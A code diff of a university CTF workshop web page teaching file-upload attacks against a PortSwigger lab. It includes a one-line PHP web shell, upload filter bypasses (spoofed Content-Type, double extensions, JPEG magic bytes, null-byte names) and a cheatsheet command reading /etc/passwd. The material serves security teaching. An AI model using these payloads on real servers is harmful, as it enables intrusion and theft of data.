-          <strong><span class="locale-en">Demo prerequisite</span><span class="locale-ar" lang="ar">متطلب
-              العرض</span></strong>
-          <span class="locale-en">Practice a file upload RCE path through the PortSwigger lab.</span>
-          <span class="locale-ar" lang="ar">تدرّب على مسار استغلال رفع الملفات المؤدي إلى تنفيذ أوامر عن بُعد داخل مختبر
-            PortSwigger.</span>
-        </a>
+    <div class="nav-right">
+      <span class="nav-badge">MODULE 05 · API EXPLOITATION & FILE ATTACKS</span>
+      <button class="theme-btn" id="themeBtn" title="Toggle theme">☀️</button>
+    </div>
+  </nav>
+
+  <div class="section-nav" id="sectionNav">
+    <div class="nav-dot active" data-target="hero"></div>
+    <div class="nav-dot" data-target="objectives"></div>
+    <div class="nav-dot" data-target="concepts"></div>
+    <div class="nav-dot" data-target="howitworks"></div>
+    <div class="nav-dot" data-target="demo"></div>
+    <div class="nav-dot" data-target="pitfalls"></div>
+    <div class="nav-dot" data-target="quiz"></div>
+    <div class="nav-dot" data-target="challenge"></div>
+    <div class="nav-dot" data-target="resources"></div>
+  </div>
+
+  <main>
+    <!-- HERO -->
+    <section id="hero">
+      <div class="scan-line"
+        style="position:absolute; left:0; right:0; height:2px; background:linear-gradient(90deg,transparent,var(--accent),transparent); animation:scan 4s linear infinite; opacity:0.4; pointer-events:none;">
+      </div>
+      <div class="hero">
+        <div class="hero-tag">SPRING 2026 · CTF WORKSHOP SERIES · PSU</div>
+        <h1>API Exploitation<br><span>& File Attacks</span></h1>
+        <p class="hero-sub">When an API doesn't check whether the file type a user claims matches the file they actually
+          upload, an attacker can rename a web shell to "profile.jpg" and get remote code execution. Today we'll do
+          exactly that.</p>
+        <div class="hero-cta">
+          <a href="#objectives" class="btn btn-primary">▶ Start Workshop</a>
+          <a href="#challenge" class="btn btn-ghost">Skip to Challenge →</a>
+        </div>
+        <div class="hero-scroll">
+          <div class="scroll-line"></div><span class="scroll-text">SCROLL TO BEGIN</span>
+        </div>
       </div>
     </section>
-  </div>
+
+    <!-- OBJECTIVES -->
+    <section id="objectives" class="section">
+      <div class="sec-label">SECTION 01 · LEARNING OBJECTIVES</div>
+      <h2 class="sec-title">What You'll Learn</h2>
+      <p class="sec-sub">By the end of this workshop, you'll be able to identify and exploit insecure file upload
+        endpoints to achieve remote code execution.</p>
+      <div class="obj-grid">
+        <div class="obj-card">
+          <div class="obj-num">01</div>
+          <div class="obj-title">Identify</div>
+          <div class="obj-desc">Locate insecure file upload endpoints in APIs by testing MIME type and extension
+            validation.</div>
+        </div>
+        <div class="obj-card">
+          <div class="obj-num">02</div>
+          <div class="obj-title">Exploit</div>
+          <div class="obj-desc">Upload and execute a web shell on a target server through a vulnerable upload function.
+          </div>
+        </div>
+        <div class="obj-card">
+          <div class="obj-num">03</div>
+          <div class="obj-title">Bypass</div>
+          <div class="obj-desc">Evade client-side and server-side upload filters using extension spoofing and
+            content-type manipulation.</div>
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- CORE CONCEPTS -->
+    <section id="concepts" class="section">
+      <div class="sec-label">SECTION 02 · CORE CONCEPTS</div>
+      <h2 class="sec-title">Unrestricted File Upload</h2>
+      <p class="sec-sub">Many APIs rely on client-supplied headers or file extensions to validate uploads—neither is
+        trustworthy.</p>
+      <div class="concept-grid">
+        <div class="concept-card">
+          <div class="concept-label">THE GAP</div>
+          <div class="concept-title">Client-Controlled Validation</div>
+          <div class="concept-body">The server trusts the Content-Type header and file extension, both fully controlled
+            by the attacker. The gap between what the server thinks it received and what it actually stored is the
+            entire attack surface.</div>
+        </div>
+        <div class="concept-card">
+          <div class="concept-label">THE IMPACT</div>
+          <div class="concept-title">Remote Code Execution</div>
+          <div class="concept-body">When the server stores the file in a web-accessible directory and executes it based
+            on extension, uploading a file named <code>shell.php</code> disguised as an image gives the attacker a
+            foothold on the server.</div>
+        </div>
+      </div>
+
+      <!-- File upload bypass visualization -->
+      <div class="upload-viz">
+        <div style="font-family:var(--mono); font-size:0.8rem; color:var(--accent2); margin-bottom:20px;">📁 FILE UPLOAD
+          BYPASS · WEB SHELL TO RCE</div>
+        <div class="upload-step"><span class="step-badge">UPLOAD</span> <code
+            style="color:var(--text2);">filename="shell.php" Content-Type: image/jpeg</code></div>
+        <div class="upload-step"><span class="step-badge">STORE</span> <code
+            style="color:var(--text2);">/uploads/shell.php</code> <span
+            style="color:var(--success); margin-left:auto;">✓ Server accepts</span></div>
+        <div class="upload-step"><span class="step-badge">EXECUTE</span> <code
+            style="color:var(--text2);">GET /uploads/shell.php?cmd=id</code> <span style="color:var(--accent);">→
+            uid=33(www-data)</span></div>
+        <p style="margin-top:20px; font-size:0.9rem; color:var(--text2);">The server accepts the PHP file via the image
+          upload endpoint; a direct request executes it—the Content-Type check never happened.</p>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- HOW IT WORKS -->
+    <section id="howitworks" class="section">
+      <div class="sec-label">SECTION 03 · HOW IT WORKS</div>
+      <h2 class="sec-title">The 5‑Step Upload Attack</h2>
+      <p class="sec-sub">From discovering the endpoint to executing commands on the server.</p>
+      <div class="steps-container">
+        <div class="step-item">
+          <div class="step-num-wrap">
+            <div class="step-num">01</div>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Discover the upload endpoint</div>
+            <div class="step-tagline">FIND MULTIPART/FORM-DATA POST REQUESTS</div>
+            <ul class="step-list">
+              <li>Browse the app and intercept traffic in Burp Suite</li>
+              <li>Look for parameters like <code>file=</code>, <code>attachment=</code>, or <code>avatar=</code></li>
+            </ul>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num-wrap">
+            <div class="step-num">02</div>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Probe validation logic</div>
+            <div class="step-tagline">TEST WHAT THE SERVER ACTUALLY CHECKS</div>
+            <ul class="step-list">
+              <li>Upload a normal image; confirm success and note stored URL</li>
+              <li>Upload a .php file with safe Content-Type; observe rejection reason</li>
+            </ul>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num-wrap">
+            <div class="step-num">03</div>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Craft bypass payload</div>
+            <div class="step-tagline">SPOOF EXTENSION AND MIME TYPE</div>
+            <ul class="step-list">
+              <li>Rename shell to double extension: <code>shell.php.jpg</code> or <code>shell.pHp</code></li>
+              <li>Set <code>Content-Type: image/jpeg</code> while keeping .php in filename</li>
+            </ul>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num-wrap">
+            <div class="step-num">04</div>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Send crafted request</div>
+            <div class="step-tagline">UPLOAD VIA BURP REPEATER</div>
+            <ul class="step-list">
+              <li>Send multipart request with spoofed headers</li>
+              <li>Confirm server returns 200/201 with file path</li>
+            </ul>
+          </div>
+        </div>
+        <div class="step-item">
+          <div class="step-num-wrap">
+            <div class="step-num">05</div>
+          </div>
+          <div class="step-content">
+            <div class="step-title">Trigger remote code execution</div>
+            <div class="step-tagline">REQUEST THE STORED SHELL</div>
+            <ul class="step-list">
+              <li>Visit stored file URL in browser or via curl</li>
+              <li>Append <code>?cmd=id</code> to confirm execution as web server user</li>
+            </ul>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- DEMO -->
+    <section id="demo" class="section">
+      <div class="sec-label">SECTION 04 · DEMO WALKTHROUGH</div>
+      <div class="demo-card">
+        <div class="demo-big">DEMO.</div>
+        <div class="demo-sub">PortSwigger Lab: Remote code execution via web shell upload</div>
+        <div class="prereq-grid">
+          <div class="prereq-item">
+            <div class="prereq-key">LAB</div>
+            <div class="prereq-val">Web shell upload (RCE)</div>
+          </div>
+          <div class="prereq-item">
+            <div class="prereq-key">TOOLS</div>
+            <div class="prereq-val">Burp Suite / Browser</div>
+          </div>
+          <div class="prereq-item">
+            <div class="prereq-key">STATE</div>
+            <div class="prereq-val">Lab launched, logged in</div>
+          </div>
+        </div>
+        <div class="demo-script">
+          <div style="font-family:var(--mono); color:var(--accent); margin-bottom:16px;">▶ SCRIPT</div>
+          <pre># Step 1: Upload a normal image to learn the stored path
+Upload any .jpg via avatar form; note response path
+→ Expected: /files/avatars/photo.jpg visible
+
+# Step 2: Create minimal PHP web shell
+&lt;?php echo system($_GET['cmd']); ?&gt;
+→ Save locally as shell.php
+
+# Step 3: Upload shell.php as if it were an image (Burp Repeater)
+Content-Disposition: form-data; name="avatar"; filename="shell.php"
+Content-Type: image/jpeg
+→ Expected: HTTP 200, file stored as /files/avatars/shell.php
+
+# Step 4: Execute command via shell
+GET /files/avatars/shell.php?cmd=cat+/home/carlos/secret
+→ Expected: Carlos's secret string printed</pre>
+        </div>
+        <div class="fallback-note">
+          ⚠️ Fallback: Pre-recorded walkthrough available in shared drive under /demos/api-file-attacks/.
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- PITFALLS -->
+    <section id="pitfalls" class="section">
+      <div class="sec-label">SECTION 05 · COMMON PITFALLS</div>
+      <h2 class="sec-title">Troubleshooting</h2>
+      <div class="pitfall-grid">
+        <div class="pitfall-card">
+          <div class="pitfall-symptom">SYMPTOM</div>
+          <div class="pitfall-title">Shell uploads but returns PHP source, not execution</div>
+          <div class="pitfall-row"><span>CAUSE</span><span class="val">Server not configured to execute PHP in upload
+              dir</span></div>
+          <div class="pitfall-row fix"><span>FIX</span><span class="val">Try alternative extensions: .phtml, .php5,
+              .phar</span></div>
+        </div>
+        <div class="pitfall-card">
+          <div class="pitfall-symptom">SYMPTOM</div>
+          <div class="pitfall-title">Upload returns 403 'invalid file type'</div>
+          <div class="pitfall-row"><span>CAUSE</span><span class="val">Server validates magic bytes (file
+              signature)</span></div>
+          <div class="pitfall-row fix"><span>FIX</span><span class="val">Prepend valid JPEG magic bytes (\xFF\xD8\xFF)
+              to payload</span></div>
+        </div>
+        <div class="pitfall-card">
+          <div class="pitfall-symptom">SYMPTOM</div>
+          <div class="pitfall-title">Command output is empty</div>
+          <div class="pitfall-row"><span>CAUSE</span><span class="val">system() disabled; disable_functions blocks
+              it</span></div>
+          <div class="pitfall-row fix"><span>FIX</span><span class="val">Try passthru(), shell_exec(), or exec()</span>
+          </div>
+        </div>
+        <div class="pitfall-card">
+          <div class="pitfall-symptom">SYMPTOM</div>
+          <div class="pitfall-title">Double extension not working</div>
+          <div class="pitfall-row"><span>CAUSE</span><span class="val">Server only checks final extension</span></div>
+          <div class="pitfall-row fix"><span>FIX</span><span class="val">Try null-byte: shell.php%00.jpg (older
+              PHP)</span></div>
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- QUIZ -->
+    <section id="quiz" class="section">
+      <div class="sec-label">SECTION 06 · POP QUIZ</div>
+      <h2 class="sec-title">Test Your Knowledge</h2>
+      <div class="quiz-score-bar">
+        <div>
+          <div class="score-label">YOUR SCORE</div>
+          <div class="score-val" id="scoreVal">0 / 5</div>
+        </div>
+        <div class="score-track">
+          <div class="score-fill" id="scoreFill"></div>
+        </div>
+      </div>
+      <div id="quizContainer">
+        <div class="quiz-card" id="q1">
+          <div class="quiz-num">QUESTION 01 / 05</div>
+          <div class="quiz-q">Why is client-side file validation insufficient for security?</div>
+          <div class="quiz-opts">
+            <button class="quiz-opt" onclick="answer(this,'q1',false)"><span class="opt-letter">A</span> It slows down
+              the upload process</button>
+            <button class="quiz-opt" onclick="answer(this,'q1',true)"><span class="opt-letter">B</span> Attackers can
+              bypass it by modifying requests after they leave the browser</button>
+            <button class="quiz-opt" onclick="answer(this,'q1',false)"><span class="opt-letter">C</span> It only works
+              on JPEG files</button>
+            <button class="quiz-opt" onclick="answer(this,'q1',false)"><span class="opt-letter">D</span> It requires
+              JavaScript to be enabled</button>
+          </div>
+          <div class="quiz-feedback" id="q1-fb"></div>
+        </div>
+        <div class="quiz-card" id="q2">
+          <div class="quiz-num">QUESTION 02 / 05</div>
+          <div class="quiz-q">What is the purpose of setting <code>Content-Type: image/jpeg</code> when uploading a PHP
+            shell?</div>
+          <div class="quiz-opts">
+            <button class="quiz-opt" onclick="answer(this,'q2',false)"><span class="opt-letter">A</span> To make the
+              file smaller</button>
+            <button class="quiz-opt" onclick="answer(this,'q2',true)"><span class="opt-letter">B</span> To spoof the
+              MIME type and bypass header-based validation</button>
+            <button class="quiz-opt" onclick="answer(this,'q2',false)"><span class="opt-letter">C</span> To encrypt the
+              payload</button>
+            <button class="quiz-opt" onclick="answer(this,'q2',false)"><span class="opt-letter">D</span> To trigger a
+              specific server error</button>
+          </div>
+          <div class="quiz-feedback" id="q2-fb"></div>
+        </div>
+        <div class="quiz-card" id="q3">
+          <div class="quiz-num">QUESTION 03 / 05</div>
+          <div class="quiz-q">Which alternative PHP extension might execute when <code>.php</code> is blacklisted?</div>
+          <div class="quiz-opts">
+            <button class="quiz-opt" onclick="answer(this,'q3',false)"><span class="opt-letter">A</span> .jpg</button>
+            <button class="quiz-opt" onclick="answer(this,'q3',false)"><span class="opt-letter">B</span> .txt</button>
+            <button class="quiz-opt" onclick="answer(this,'q3',true)"><span class="opt-letter">C</span> .phtml</button>
+            <button class="quiz-opt" onclick="answer(this,'q3',false)"><span class="opt-letter">D</span> .png</button>
+          </div>
+          <div class="quiz-feedback" id="q3-fb"></div>
+        </div>
+        <div class="quiz-card" id="q4">
+          <div class="quiz-num">QUESTION 04 / 05</div>
+          <div class="quiz-q">What is the minimal PHP web shell payload used in the demo?</div>
+          <div class="quiz-opts">
+            <button class="quiz-opt" onclick="answer(this,'q4',true)"><span class="opt-letter">A</span>
+              <code>&lt;?php echo system($_GET['cmd']); ?&gt;</code></button>
+            <button class="quiz-opt" onclick="answer(this,'q4',false)"><span class="opt-letter">B</span>
+              <code>&lt;?php phpinfo(); ?&gt;</code></button>
+            <button class="quiz-opt" onclick="answer(this,'q4',false)"><span class="opt-letter">C</span>
+              <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></button>
+            <button class="quiz-opt" onclick="answer(this,'q4',false)"><span class="opt-letter">D</span>
+              <code>&lt;?= 'hello' ?&gt;</code></button>
+          </div>
+          <div class="quiz-feedback" id="q4-fb"></div>
+        </div>
+        <div class="quiz-card" id="q5">
+          <div class="quiz-num">QUESTION 05 / 05</div>
+          <div class="quiz-q">If the server checks magic bytes, how can you still upload a PHP shell?</div>
+          <div class="quiz-opts">
+            <button class="quiz-opt" onclick="answer(this,'q5',false)"><span class="opt-letter">A</span> Use a different
+              browser</button>
+            <button class="quiz-opt" onclick="answer(this,'q5',true)"><span class="opt-letter">B</span> Prepend valid
+              JPEG bytes (<code>\xFF\xD8\xFF</code>) before the PHP code</button>
+            <button class="quiz-opt" onclick="answer(this,'q5',false)"><span class="opt-letter">C</span> Rename the file
+              to .txt</button>
+            <button class="quiz-opt" onclick="answer(this,'q5',false)"><span class="opt-letter">D</span> Disable Burp
+              Suite interception</button>
+          </div>
+          <div class="quiz-feedback" id="q5-fb"></div>
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- CHALLENGE + CHEATSHEET -->
+    <section id="challenge" class="section">
+      <div class="sec-label">SECTION 07 · YOUR CHALLENGE</div>
+      <h2 class="sec-title">Now Do It Yourself</h2>
+      <div class="challenge-card">
+        <div class="challenge-badges"><span class="badge badge-time">⏱ 10-15 MIN</span><span class="badge badge-level">◉
+            BEGINNER</span></div>
+        <div class="challenge-task-label">THE TASK</div>
+        <div class="challenge-task">Use the provided PortSwigger lab to upload a PHP web shell disguised as a profile
+          image, then use it to read the secret file stored in Carlos's home directory.</div>
+        <div class="success-box">
+          <div class="success-label">SUCCESS CRITERION</div>
+          <div class="success-text">Screenshot showing the secret string from /home/carlos/secret printed in
+            browser/Burp, alongside the upload request confirming .php was accepted.</div>
+        </div>
+        <div
+          style="font-family:var(--mono);font-size:0.65rem;color:var(--text3);letter-spacing:0.15em;margin-bottom:16px">
+          HINTS</div>
+        <div class="hints-grid">
+          <div class="hint-card">
+            <div class="hint-num">01</div>
+            <div class="hint-text">Look at how the avatar upload form sends the file — what headers identify the file
+              type?</div>
+          </div>
+          <div class="hint-card">
+            <div class="hint-num">02</div>
+            <div class="hint-text">Try changing only the filename in the Content-Disposition header and resending.</div>
+          </div>
+          <div class="hint-card">
+            <div class="hint-num">03</div>
+            <div class="hint-text">Your shell only needs one line: &lt;?php echo system($_GET['cmd']); ?&gt; and the URL
+              parameter ?cmd= to run commands.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Cheatsheet -->
+      <div style="margin-top:40px;">
+        <div class="sec-label" style="margin-bottom:24px;">CHEATSHEET · FILE UPLOAD BYPASS</div>
+        <div style="background:var(--card); border:1px solid var(--border); border-radius:20px; padding:28px;">
+          <table class="cheatsheet-table">
+            <thead>
+              <tr>
+                <th>COMMAND / PAYLOAD</th>
+                <th>WHAT IT DOES</th>
+                <th>WHEN TO USE</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><code>&lt;?php echo system($_GET['cmd']); ?&gt;</code></td>
+                <td>Minimal web shell; runs OS commands via URL</td>
+                <td>First shell to try</td>
+              </tr>
+              <tr>
+                <td><code>filename="shell.php.jpg"</code></td>
+                <td>Double extension bypass</td>
+                <td>When server blocks .php by extension</td>
+              </tr>
+              <tr>
+                <td><code>Content-Type: image/jpeg</code></td>
+                <td>Spoof MIME type in upload request</td>
+                <td>When server checks header only</td>
+              </tr>
+              <tr>
+                <td><code>\xFF\xD8\xFF</code> + PHP code</td>
+                <td>Prepend JPEG magic bytes to payload</td>
+                <td>When server checks magic bytes</td>
+              </tr>
+              <tr>
+                <td><code>?cmd=id</code></td>
+                <td>Verify RCE as current user</td>
+                <td>Confirm shell executed</td>
+              </tr>
+              <tr>
+                <td><code>?cmd=cat+/etc/passwd</code></td>
+                <td>Read sensitive system file</td>
+                <td>Privilege escalation recon</td>
+              </tr>
+              <tr>
+                <td><code>.phtml / .php5 / .phar</code></td>
+                <td>Alternative PHP extensions</td>
+                <td>When .php is blacklisted</td>
+              </tr>
+              <tr>
+                <td><code>passthru() / shell_exec()</code></td>
+                <td>Alternative exec functions</td>
+                <td>When system() is disabled</td>
+              </tr>
+              <tr>
+                <td><code>filename="shell.php%00.jpg"</code></td>
+                <td>Null-byte bypass (older PHP)</td>
+                <td>Server truncates at null byte</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </section>
+
+    <div class="divider"></div>
+
+    <!-- RESOURCES -->
+    <section id="resources" class="section">
+      <div class="sec-label">SECTION 08 · FURTHER READING</div>
+      <h2 class="sec-title">Go Deeper</h2>
+      <div class="resource-list">
+        <div class="resource-item">
+          <div class="resource-num">01</div>
+          <div class="resource-info">
+            <h4>PortSwigger: File Upload Vulnerabilities</h4>
+            <p>Covers all bypass techniques with progressive interactive labs.</p>
+          </div>
+        </div>
+        <div class="resource-item">
+          <div class="resource-num">02</div>
+          <div class="resource-info">
+            <h4>OWASP Unrestricted File Upload</h4>
+            <p>Canonical reference for defensive controls: store outside webroot, randomize filenames, validate magic
+              bytes.</p>
+          </div>
+        </div>
+        <div class="resource-item">
+          <div class="resource-num">03</div>
+          <div class="resource-info">
+            <h4>HackTricks: File Upload</h4>
+            <p>Comprehensive attacker's cheatsheet of extension bypasses, magic byte tricks, and race condition uploads.
+            </p>
+          </div>
+        </div>
+      </div>
+      <div
+        style="margin-top:60px; text-align:center; padding:40px; background:var(--card); border:1px solid var(--border); border-radius:20px;">
+        <div style="font-family:var(--head);font-weight:800;font-size:2rem;color:var(--text);margin-bottom:8px">
+          Questions?</div>
+        <div style="font-size:0.9rem;color:var(--text2);margin-bottom:24px">Bring them to the CTF WhatsApp Group.</div>
+        <span
+          style="font-family:var(--mono);font-size:0.72rem;color:var(--accent);letter-spacing:0.15em;padding:8px 20px;border:1px solid var(--border2);border-radius:20px">CyberTech
+          Club @ PSU · Spring 2026</span>
+      </div>
+    </section>
+  </main>
+
   <script>
-    const THEME_KEY = "acm-theme", LANG_KEY = "acm-lang", root = document.documentElement, themeBtn = document.getElementById("themeBtn"), langBtn = document.getElementById("langBtn");
-    let theme = localStorage.getItem(THEME_KEY) || "dark", lang = localStorage.getItem(LANG_KEY) || "en";
-    function applyTheme(nextTheme) { theme = nextTheme === "light" ? "light" : "dark"; root.setAttribute("data-theme", theme); themeBtn.textContent = theme === "dark" ? "☀" : "☾"; localStorage.setItem(THEME_KEY, theme); }
-    function applyLang(nextLang) { lang = nextLang === "ar" ? "ar" : "en"; root.setAttribute("lang", lang); root.setAttribute("dir", lang === "ar" ? "rtl" : "ltr"); langBtn.textContent = lang === "en" ? "AR" : "EN"; localStorage.setItem(LANG_KEY, lang); }
-    themeBtn.addEventListener("click", () => applyTheme(theme === "dark" ? "light" : "dark"));
-    langBtn.addEventListener("click", () => applyLang(lang === "en" ? "ar" : "en"));
-    applyTheme(theme); applyLang(lang);
+    const html = document.documentElement;
+    const themeBtn = document.getElementById('themeBtn');
+    themeBtn.addEventListener('click', () => {
+      const isDark = html.dataset.theme === 'dark';
+      html.dataset.theme = isDark ? 'light' : 'dark';
+      themeBtn.textContent = isDark ? '🌙' : '☀️';
+    });
+
+    const progressFill = document.getElementById('progressFill');
+    window.addEventListener('scroll', () => {
+      const scrolled = window.scrollY;
+      const total = document.body.scrollHeight - window.innerHeight;
+      progressFill.style.width = (scrolled / total * 100) + '%';
+      updateNavDots();
+    });
+
+    const sections = document.querySelectorAll('.section');
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('visible'); });
+    }, { threshold: 0.1 });
+    sections.forEach(s => observer.observe(s));
+
+    const allSections = ['hero', 'objectives', 'concepts', 'howitworks', 'demo', 'pitfalls', 'quiz', 'challenge', 'resources'];
+    const dots = document.querySelectorAll('.nav-dot');
+
+    function updateNavDots() {
+      let current = 'hero';
+      allSections.forEach(id => {
+        const el = document.getElementById(id);
+        if (el && el.getBoundingClientRect().top < window.innerHeight * 0.5) current = id;
+      });
+      dots.forEach((dot, i) => dot.classList.toggle('active', allSections[i] === current));
+    }
+    dots.forEach((dot, i) => dot.addEventListener('click', () => document.getElementById(allSections[i])?.scrollIntoView({ behavior: 'smooth' })));
+
+    function toggleDive(btn) {
+      btn.classList.toggle('open');
+      btn.nextElementSibling.classList.toggle('open');
+    }
+
+    const feedbacks = {
+      q1: { correct: "✓ Correct! Client-side validation is trivial to bypass by intercepting and modifying the request.", wrong: "✗ Client-side validation happens in the browser; attackers control everything after it leaves." },
+      q2: { correct: "✓ Exactly! The Content-Type header is just a label; changing it tricks servers that only check the header.", wrong: "✗ The Content-Type header tells the server what type of file you claim to be sending—attackers can lie." },
+      q3: { correct: "✓ Yes. .phtml, .php5, .phar are often configured to execute as PHP when .php is blocked.", wrong: "✗ Alternative PHP extensions like .phtml or .php5 may still be executed by the server." },
+      q4: { correct: "✓ That one-liner is the classic minimal web shell: it takes a cmd parameter and runs it via system().", wrong: "✗ The minimal shell is &lt;?php echo system($_GET['cmd']); ?&gt;—one line, full RCE." },
+      q5: { correct: "✓ Correct! Prepending valid magic bytes makes the file pass signature checks while still containing PHP.", wrong: "✗ Magic bytes are the first few bytes of a file; prepending JPEG bytes tricks signature validation." }
+    };
+    let scores = {};
+    function answer(btn, qId, isCorrect) {
+      const card = document.getElementById(qId);
+      if (card.dataset.answered) return;
+      card.dataset.answered = '1';
+      const opts = card.querySelectorAll('.quiz-opt');
+      opts.forEach(o => { o.classList.add('disabled'); o.style.pointerEvents = 'none'; });
+      btn.classList.add(isCorrect ? 'correct' : 'wrong');
+      if (!isCorrect) opts.forEach(o => { if (o.getAttribute('onclick').includes('true')) o.classList.add('correct'); });
+      const fb = document.getElementById(qId + '-fb');
+      fb.textContent = isCorrect ? feedbacks[qId].correct : feedbacks[qId].wrong;
+      fb.className = 'quiz-feedback show ' + (isCorrect ? 'correct' : 'wrong');
+      if (isCorrect) scores[qId] = 1;
+      updateScore();
+    }
+    function updateScore() {
+      const total = Object.values(scores).reduce((a, b) => a + b, 0);
+      document.getElementById('scoreVal').textContent = total + ' / 5';
+      document.getElementById('scoreFill').style.width = (total / 5 * 100) + '%';
+    }
+
+    const objCards = document.querySelectorAll('.obj-card, .concept-card, .pitfall-card, .resource-item');
+    const cardObs = new IntersectionObserver((entries) => {
+      entries.forEach(e => {
+        if (e.isIntersecting) {
+          e.target.style.transitionDelay = (Array.from(e.target.parentNode.children).indexOf(e.target) * 0.1) + 's';
+          e.target.style.opacity = '1'; e.target.style.transform = 'translateY(0)';
+        }
+      });
+    }, { threshold: 0.15 });
+    objCards.forEach(c => {
+      c.style.opacity = '0'; c.style.transform = 'translateY(24px)'; c.style.transition = 'opacity 0.5s ease, transform 0.5s ease';
+      cardObs.observe(c);
+    });
   </script>
 </body>
 
